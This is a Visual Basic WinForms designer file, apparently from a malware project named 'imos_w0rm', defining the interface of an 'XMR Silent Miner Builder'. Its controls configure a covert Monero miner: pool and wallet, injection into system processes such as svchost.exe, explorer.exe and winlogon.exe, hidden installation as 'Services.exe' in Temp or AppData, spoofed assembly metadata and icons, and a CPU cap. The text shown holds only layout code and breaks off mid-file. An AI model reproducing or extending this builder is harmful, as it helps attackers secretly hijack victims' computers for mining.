<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form7
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form7))
        Me.AzenisForm1 = New imos_w0rm.AzenisForm()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.MinerPanel = New System.Windows.Forms.TabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.txtInjection = New System.Windows.Forms.ComboBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.txtPoolURL = New System.Windows.Forms.TextBox()
        Me.txtPoolPassowrd = New System.Windows.Forms.TextBox()
        Me.txtPoolUsername = New System.Windows.Forms.TextBox()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.chkInstall = New imos_w0rm.AzenisCheckbox()
        Me.txtInstallFileName = New System.Windows.Forms.TextBox()
        Me.txtInstallPathMain = New System.Windows.Forms.ComboBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.chkAssembly = New imos_w0rm.AzenisCheckbox()
        Me.btn_assemblyRandom = New imos_w0rm.AzenisButton()
        Me.btn_assemblyClone = New imos_w0rm.AzenisButton()
        Me.num_Assembly4 = New System.Windows.Forms.TextBox()
        Me.num_Assembly3 = New System.Windows.Forms.TextBox()
        Me.num_Assembly2 = New System.Windows.Forms.TextBox()
        Me.num_Assembly1 = New System.Windows.Forms.TextBox()
        Me.txtTrademark = New System.Windows.Forms.TextBox()
        Me.txtCopyright = New System.Windows.Forms.TextBox()
        Me.txtProduct = New System.Windows.Forms.TextBox()
        Me.txtCompany = New System.Windows.Forms.TextBox()
        Me.txtDescription = New System.Windows.Forms.TextBox()
        Me.txtTitle = New System.Windows.Forms.TextBox()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.btnBrowseIcon = New imos_w0rm.AzenisButton()
        Me.chkIcon = New imos_w0rm.AzenisCheckbox()
        Me.picIcon = New System.Windows.Forms.PictureBox()
        Me.txtIconPath = New System.Windows.Forms.TextBox()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.btnBuild = New imos_w0rm.AzenisButton()
        Me.ProgressBar10 = New System.Windows.Forms.ProgressBar()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.txtMaxCPU = New System.Windows.Forms.ComboBox()
        Me.txtLog = New System.Windows.Forms.RichTextBox()
        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.AzenisForm1.SuspendLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.MinerPanel.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        CType(Me.picIcon, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage5.SuspendLayout()
        Me.SuspendLayout()
        '
        'AzenisForm1
        '
        Me.AzenisForm1.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.AzenisForm1.Controls.Add(Me.PictureBox2)
        Me.AzenisForm1.Controls.Add(Me.PictureBox1)
        Me.AzenisForm1.Controls.Add(Me.MinerPanel)
        Me.AzenisForm1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.AzenisForm1.Font = New System.Drawing.Font("Segoe UI", 10.0!)
        Me.AzenisForm1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(146, Byte), Integer), CType(CType(149, Byte), Integer), CType(CType(152, Byte), Integer))
        Me.AzenisForm1.Location = New System.Drawing.Point(0, 0)
        Me.AzenisForm1.MinimumSize = New System.Drawing.Size(305, 150)
        Me.AzenisForm1.Name = "AzenisForm1"
        Me.AzenisForm1.Size = New System.Drawing.Size(450, 265)
        Me.AzenisForm1.TabIndex = 0
        Me.AzenisForm1.Text = "XMR Silent Miner Builder"
        '
        'PictureBox2
        '
        Me.PictureBox2.BackColor = System.Drawing.Color.Transparent
        Me.PictureBox2.BackgroundImage = CType(resources.GetObject("PictureBox2.BackgroundImage"), System.Drawing.Image)
        Me.PictureBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.PictureBox2.Location = New System.Drawing.Point(382, 5)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(23, 22)
        Me.PictureBox2.TabIndex = 5
        Me.PictureBox2.TabStop = False
        '
        'PictureBox1
        '
        Me.PictureBox1.BackColor = System.Drawing.Color.Transparent
        Me.PictureBox1.BackgroundImage = CType(resources.GetObject("PictureBox1.BackgroundImage"), System.Drawing.Image)
        Me.PictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.PictureBox1.Location = New System.Drawing.Point(411, 5)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(23, 22)
        Me.PictureBox1.TabIndex = 4
        Me.PictureBox1.TabStop = False
        '
        'MinerPanel
        '
        Me.MinerPanel.Controls.Add(Me.TabPage1)
        Me.MinerPanel.Controls.Add(Me.TabPage2)
        Me.MinerPanel.Controls.Add(Me.TabPage3)
        Me.MinerPanel.Controls.Add(Me.TabPage4)
        Me.MinerPanel.Controls.Add(Me.TabPage5)
        Me.MinerPanel.Location = New System.Drawing.Point(12, 42)
        Me.MinerPanel.Name = "MinerPanel"
        Me.MinerPanel.SelectedIndex = 0
        Me.MinerPanel.Size = New System.Drawing.Size(426, 211)
        Me.MinerPanel.TabIndex = 1
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.txtInjection)
        Me.TabPage1.Controls.Add(Me.Label5)
        Me.TabPage1.Controls.Add(Me.txtPoolURL)
        Me.TabPage1.Controls.Add(Me.txtPoolPassowrd)
        Me.TabPage1.Controls.Add(Me.txtPoolUsername)
        Me.TabPage1.Controls.Add(Me.Label8)
        Me.TabPage1.Controls.Add(Me.Label7)
        Me.TabPage1.Controls.Add(Me.Label6)
        Me.TabPage1.ForeColor = System.Drawing.Color.RoyalBlue
        Me.TabPage1.Location = New System.Drawing.Point(4, 26)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(418, 181)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Pool"
        '
        'txtInjection
        '
        Me.txtInjection.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtInjection.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.txtInjection.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtInjection.FormattingEnabled = True
        Me.txtInjection.Items.AddRange(New Object() {"WinBioDataModelOOBE.exe (%WINDIR%\System32)", "winload.exe (%WINDIR%\System32)", "wksprt.exe (%WINDIR%\System32)", "dwm.exe (%WINDIR%\System32)", "wpnpinst.exe (%WINDIR%\System32)", "winlogon.exe (%WINDIR%\System32)", "explorer.exe (%WINDIR%)", "svchost.exe (%WINDIR%\System32)", "nslookup.exe (%WINDIR%\System32)", "cmd.exe (%WINDIR%\System32)", "notepad.exe (%WINDIR%\System32)"})
        Me.txtInjection.Location = New System.Drawing.Point(125, 132)
        Me.txtInjection.Name = "txtInjection"
        Me.txtInjection.Size = New System.Drawing.Size(254, 25)
        Me.txtInjection.TabIndex = 26
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.ForeColor = System.Drawing.Color.RoyalBlue
        Me.Label5.Location = New System.Drawing.Point(35, 135)
        Me.Label5.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(64, 19)
        Me.Label5.TabIndex = 25
        Me.Label5.Text = "Injection:"
        '
        'txtPoolURL
        '
        Me.txtPoolURL.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtPoolURL.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtPoolURL.Location = New System.Drawing.Point(125, 28)
        Me.txtPoolURL.Name = "txtPoolURL"
        Me.txtPoolURL.Size = New System.Drawing.Size(254, 25)
        Me.txtPoolURL.TabIndex = 21
        Me.txtPoolURL.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtPoolPassowrd
        '
        Me.txtPoolPassowrd.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtPoolPassowrd.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtPoolPassowrd.Location = New System.Drawing.Point(125, 97)
        Me.txtPoolPassowrd.Name = "txtPoolPassowrd"
        Me.txtPoolPassowrd.Size = New System.Drawing.Size(254, 25)
        Me.txtPoolPassowrd.TabIndex = 20
        Me.txtPoolPassowrd.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtPoolUsername
        '
        Me.txtPoolUsername.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtPoolUsername.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtPoolUsername.Location = New System.Drawing.Point(125, 62)
        Me.txtPoolUsername.Name = "txtPoolUsername"
        Me.txtPoolUsername.Size = New System.Drawing.Size(254, 25)
        Me.txtPoolUsername.TabIndex = 19
        Me.txtPoolUsername.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.ForeColor = System.Drawing.Color.RoyalBlue
        Me.Label8.Location = New System.Drawing.Point(35, 31)
        Me.Label8.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(38, 19)
        Me.Label8.TabIndex = 18
        Me.Label8.Text = "Pool:"
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.ForeColor = System.Drawing.Color.RoyalBlue
        Me.Label7.Location = New System.Drawing.Point(35, 100)
        Me.Label7.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(70, 19)
        Me.Label7.TabIndex = 17
        Me.Label7.Text = "Password:"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.ForeColor = System.Drawing.Color.RoyalBlue
        Me.Label6.Location = New System.Drawing.Point(35, 65)
        Me.Label6.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(82, 19)
        Me.Label6.TabIndex = 16
        Me.Label6.Text = "User/Wallet:"
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.chkInstall)
        Me.TabPage2.Controls.Add(Me.txtInstallFileName)
        Me.TabPage2.Controls.Add(Me.txtInstallPathMain)
        Me.TabPage2.Controls.Add(Me.Label2)
        Me.TabPage2.Controls.Add(Me.Label1)
        Me.TabPage2.ForeColor = System.Drawing.Color.RoyalBlue
        Me.TabPage2.Location = New System.Drawing.Point(4, 26)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(385, 181)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Install"
        '
        'chkInstall
        '
        Me.chkInstall.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.chkInstall.Checked = False
        Me.chkInstall.Font = New System.Drawing.Font("Trebuchet MS", 10.0!)
        Me.chkInstall.ForeColor = System.Drawing.Color.FromArgb(CType(CType(146, Byte), Integer), CType(CType(149, Byte), Integer), CType(CType(152, Byte), Integer))
        Me.chkInstall.Location = New System.Drawing.Point(16, 17)
        Me.chkInstall.MinimumSize = New System.Drawing.Size(20, 20)
        Me.chkInstall.Name = "chkInstall"
        Me.chkInstall.Size = New System.Drawing.Size(117, 21)
        Me.chkInstall.TabIndex = 27
        Me.chkInstall.Text = "Installl Disabled"
        '
        'txtInstallFileName
        '
        Me.txtInstallFileName.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtInstallFileName.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtInstallFileName.Location = New System.Drawing.Point(144, 104)
        Me.txtInstallFileName.Name = "txtInstallFileName"
        Me.txtInstallFileName.Size = New System.Drawing.Size(197, 25)
        Me.txtInstallFileName.TabIndex = 26
        Me.txtInstallFileName.Text = "Services.exe"
        '
        'txtInstallPathMain
        '
        Me.txtInstallPathMain.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtInstallPathMain.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtInstallPathMain.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.txtInstallPathMain.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtInstallPathMain.FormattingEnabled = True
        Me.txtInstallPathMain.Items.AddRange(New Object() {"Temp", "AppData", "UserProfile"})
        Me.txtInstallPathMain.Location = New System.Drawing.Point(144, 72)
        Me.txtInstallPathMain.Name = "txtInstallPathMain"
        Me.txtInstallPathMain.Size = New System.Drawing.Size(197, 25)
        Me.txtInstallPathMain.TabIndex = 25
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.ForeColor = System.Drawing.Color.RoyalBlue
        Me.Label2.Location = New System.Drawing.Point(65, 72)
        Me.Label2.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(40, 19)
        Me.Label2.TabIndex = 22
        Me.Label2.Text = "Path:"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.ForeColor = System.Drawing.Color.RoyalBlue
        Me.Label1.Location = New System.Drawing.Point(65, 104)
        Me.Label1.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(68, 19)
        Me.Label1.TabIndex = 20
        Me.Label1.Text = "FileName:"
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.TabPage3.Controls.Add(Me.chkAssembly)
        Me.TabPage3.Controls.Add(Me.btn_assemblyRandom)
        Me.TabPage3.Controls.Add(Me.btn_assemblyClone)
        Me.TabPage3.Controls.Add(Me.num_Assembly4)
        Me.TabPage3.Controls.Add(Me.num_Assembly3)
        Me.TabPage3.Controls.Add(Me.num_Assembly2)
        Me.TabPage3.Controls.Add(Me.num_Assembly1)
        Me.TabPage3.Controls.Add(Me.txtTrademark)
        Me.TabPage3.Controls.Add(Me.txtCopyright)
        Me.TabPage3.Controls.Add(Me.txtProduct)
        Me.TabPage3.Controls.Add(Me.txtCompany)
        Me.TabPage3.Controls.Add(Me.txtDescription)
        Me.TabPage3.Controls.Add(Me.txtTitle)
        Me.TabPage3.ForeColor = System.Drawing.Color.RoyalBlue
        Me.TabPage3.Location = New System.Drawing.Point(4, 26)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage3.Size = New System.Drawing.Size(385, 181)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Assembly"
        '
        'chkAssembly
        '
        Me.chkAssembly.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.chkAssembly.Checked = False
        Me.chkAssembly.Font = New System.Drawing.Font("Trebuchet MS", 10.0!)
        Me.chkAssembly.ForeColor = System.Drawing.Color.FromArgb(CType(CType(146, Byte), Integer), CType(CType(149, Byte), Integer), CType(CType(152, Byte), Integer))
        Me.chkAssembly.Location = New System.Drawing.Point(6, 11)
        Me.chkAssembly.MinimumSize = New System.Drawing.Size(20, 20)
        Me.chkAssembly.Name = "chkAssembly"
        Me.chkAssembly.Size = New System.Drawing.Size(139, 21)
        Me.chkAssembly.TabIndex = 42
        Me.chkAssembly.Text = "Assembly Disabled"
        '
        'btn_assemblyRandom
        '
        Me.btn_assemblyRandom.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.btn_assemblyRandom.Font = New System.Drawing.Font("Trebuchet MS", 10.0!)
        Me.btn_assemblyRandom.ForeColor = System.Drawing.Color.FromArgb(CType(CType(146, Byte), Integer), CType(CType(149, Byte), Integer), CType(CType(152, Byte), Integer))
        Me.btn_assemblyRandom.Location = New System.Drawing.Point(268, 148)
        Me.btn_assemblyRandom.MinimumSize = New System.Drawing.Size(20, 20)
        Me.btn_assemblyRandom.Name = "btn_assemblyRandom"
        Me.btn_assemblyRandom.Size = New System.Drawing.Size(139, 27)
        Me.btn_assemblyRandom.TabIndex = 41
        Me.btn_assemblyRandom.Text = "Random"
        '
        'btn_assemblyClone
        '
        Me.btn_assemblyClone.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.btn_assemblyClone.Font = New System.Drawing.Font("Trebuchet MS", 10.0!)
        Me.btn_assemblyClone.ForeColor = System.Drawing.Color.FromArgb(CType(CType(146, Byte), Integer), CType(CType(149, Byte), Integer), CType(CType(152, Byte), Integer))
        Me.btn_assemblyClone.Location = New System.Drawing.Point(6, 148)
        Me.btn_assemblyClone.MinimumSize = New System.Drawing.Size(20, 20)
        Me.btn_assemblyClone.Name = "btn_assemblyClone"
        Me.btn_assemblyClone.Size = New System.Drawing.Size(139, 27)
        Me.btn_assemblyClone.TabIndex = 40
        Me.btn_assemblyClone.Text = "Clone"
        '
        'num_Assembly4
        '
        Me.num_Assembly4.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.num_Assembly4.ForeColor = System.Drawing.Color.RoyalBlue
        Me.num_Assembly4.Location = New System.Drawing.Point(384, 7)
        Me.num_Assembly4.Name = "num_Assembly4"
        Me.num_Assembly4.Size = New System.Drawing.Size(23, 25)
        Me.num_Assembly4.TabIndex = 37
        Me.num_Assembly4.Text = "0"
        '
        'num_Assembly3
        '
        Me.num_Assembly3.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.num_Assembly3.ForeColor = System.Drawing.Color.RoyalBlue
        Me.num_Assembly3.Location = New System.Drawing.Point(346, 7)
        Me.num_Assembly3.Name = "num_Assembly3"
        Me.num_Assembly3.Size = New System.Drawing.Size(23, 25)
        Me.num_Assembly3.TabIndex = 36
        Me.num_Assembly3.Text = "0"
        '
        'num_Assembly2
        '
        Me.num_Assembly2.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.num_Assembly2.ForeColor = System.Drawing.Color.RoyalBlue
        Me.num_Assembly2.Location = New System.Drawing.Point(307, 7)
        Me.num_Assembly2.Name = "num_Assembly2"
        Me.num_Assembly2.Size = New System.Drawing.Size(23, 25)
        Me.num_Assembly2.TabIndex = 35
        Me.num_Assembly2.Text = "0"
        '
        'num_Assembly1
        '
        Me.num_Assembly1.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.num_Assembly1.ForeColor = System.Drawing.Color.RoyalBlue
        Me.num_Assembly1.Location = New System.Drawing.Point(268, 7)
        Me.num_Assembly1.Name = "num_Assembly1"
        Me.num_Assembly1.Size = New System.Drawing.Size(23, 25)
        Me.num_Assembly1.TabIndex = 34
        Me.num_Assembly1.Text = "0"
        '
        'txtTrademark
        '
        Me.txtTrademark.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtTrademark.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtTrademark.Location = New System.Drawing.Point(268, 118)
        Me.txtTrademark.Name = "txtTrademark"
        Me.txtTrademark.Size = New System.Drawing.Size(139, 25)
        Me.txtTrademark.TabIndex = 32
        Me.txtTrademark.Text = "Trademark"
        '
        'txtCopyright
        '
        Me.txtCopyright.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtCopyright.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtCopyright.Location = New System.Drawing.Point(268, 78)
        Me.txtCopyright.Name = "txtCopyright"
        Me.txtCopyright.Size = New System.Drawing.Size(139, 25)
        Me.txtCopyright.TabIndex = 31
        Me.txtCopyright.Text = "Copyright"
        '
        'txtProduct
        '
        Me.txtProduct.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtProduct.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtProduct.Location = New System.Drawing.Point(268, 39)
        Me.txtProduct.Name = "txtProduct"
        Me.txtProduct.Size = New System.Drawing.Size(139, 25)
        Me.txtProduct.TabIndex = 30
        Me.txtProduct.Text = "Product"
        '
        'txtCompany
        '
        Me.txtCompany.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtCompany.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtCompany.Location = New System.Drawing.Point(6, 117)
        Me.txtCompany.Name = "txtCompany"
        Me.txtCompany.Size = New System.Drawing.Size(139, 25)
        Me.txtCompany.TabIndex = 29
        Me.txtCompany.Text = "Company"
        '
        'txtDescription
        '
        Me.txtDescription.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtDescription.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtDescription.Location = New System.Drawing.Point(6, 77)
        Me.txtDescription.Name = "txtDescription"
        Me.txtDescription.Size = New System.Drawing.Size(139, 25)
        Me.txtDescription.TabIndex = 28
        Me.txtDescription.Text = "Description"
        '
        'txtTitle
        '
        Me.txtTitle.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtTitle.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtTitle.Location = New System.Drawing.Point(6, 38)
        Me.txtTitle.Name = "txtTitle"
        Me.txtTitle.Size = New System.Drawing.Size(139, 25)
        Me.txtTitle.TabIndex = 27
        Me.txtTitle.Text = "Title"
        '
        'TabPage4
        '
        Me.TabPage4.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.TabPage4.Controls.Add(Me.btnBrowseIcon)
        Me.TabPage4.Controls.Add(Me.chkIcon)
        Me.TabPage4.Controls.Add(Me.picIcon)
        Me.TabPage4.Controls.Add(Me.txtIconPath)
        Me.TabPage4.ForeColor = System.Drawing.Color.RoyalBlue
        Me.TabPage4.Location = New System.Drawing.Point(4, 26)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage4.Size = New System.Drawing.Size(385, 181)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "Icon"
        '
        'btnBrowseIcon
        '
        Me.btnBrowseIcon.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.btnBrowseIcon.Font = New System.Drawing.Font("Trebuchet MS", 10.0!)
        Me.btnBrowseIcon.ForeColor = System.Drawing.Color.FromArgb(CType(CType(146, Byte), Integer), CType(CType(149, Byte), Integer), CType(CType(152, Byte), Integer))
        Me.btnBrowseIcon.Location = New System.Drawing.Point(6, 39)
        Me.btnBrowseIcon.MinimumSize = New System.Drawing.Size(20, 20)
        Me.btnBrowseIcon.Name = "btnBrowseIcon"
        Me.btnBrowseIcon.Size = New System.Drawing.Size(76, 25)
        Me.btnBrowseIcon.TabIndex = 44
        Me.btnBrowseIcon.Text = "Browse"
        '
        'chkIcon
        '
        Me.chkIcon.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.chkIcon.Checked = False
        Me.chkIcon.Font = New System.Drawing.Font("Trebuchet MS", 10.0!)
        Me.chkIcon.ForeColor = System.Drawing.Color.FromArgb(CType(CType(146, Byte), Integer), CType(CType(149, Byte), Integer), CType(CType(152, Byte), Integer))
        Me.chkIcon.Location = New System.Drawing.Point(6, 10)
        Me.chkIcon.MinimumSize = New System.Drawing.Size(20, 20)
        Me.chkIcon.Name = "chkIcon"
        Me.chkIcon.Size = New System.Drawing.Size(108, 21)
        Me.chkIcon.TabIndex = 43
        Me.chkIcon.Text = "Icon Disabled"
        '
        'picIcon
        '
        Me.picIcon.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None
        Me.picIcon.Image = CType(resources.GetObject("picIcon.Image"), System.Drawing.Image)
        Me.picIcon.Location = New System.Drawing.Point(147, 70)
        Me.picIcon.Name = "picIcon"
        Me.picIcon.Size = New System.Drawing.Size(122, 105)
        Me.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picIcon.TabIndex = 41
        Me.picIcon.TabStop = False
        '
        'txtIconPath
        '
        Me.txtIconPath.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtIconPath.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtIconPath.Location = New System.Drawing.Point(88, 39)
        Me.txtIconPath.Name = "txtIconPath"
        Me.txtIconPath.Size = New System.Drawing.Size(324, 25)
        Me.txtIconPath.TabIndex = 34
        '
        'TabPage5
        '
        Me.TabPage5.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.TabPage5.Controls.Add(Me.btnBuild)
        Me.TabPage5.Controls.Add(Me.ProgressBar10)
        Me.TabPage5.Controls.Add(Me.Label3)
        Me.TabPage5.Controls.Add(Me.txtMaxCPU)
        Me.TabPage5.Controls.Add(Me.txtLog)
        Me.TabPage5.ForeColor = System.Drawing.Color.RoyalBlue
        Me.TabPage5.Location = New System.Drawing.Point(4, 26)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage5.Size = New System.Drawing.Size(385, 181)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "Build"
        '
        'btnBuild
        '
        Me.btnBuild.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.btnBuild.Font = New System.Drawing.Font("Trebuchet MS", 10.0!)
        Me.btnBuild.ForeColor = System.Drawing.Color.FromArgb(CType(CType(146, Byte), Integer), CType(CType(149, Byte), Integer), CType(CType(152, Byte), Integer))
        Me.btnBuild.Location = New System.Drawing.Point(6, 138)
        Me.btnBuild.MinimumSize = New System.Drawing.Size(20, 20)
        Me.btnBuild.Name = "btnBuild"
        Me.btnBuild.Size = New System.Drawing.Size(406, 37)
        Me.btnBuild.TabIndex = 44
        Me.btnBuild.Text = "Build Silent Miner"
        '
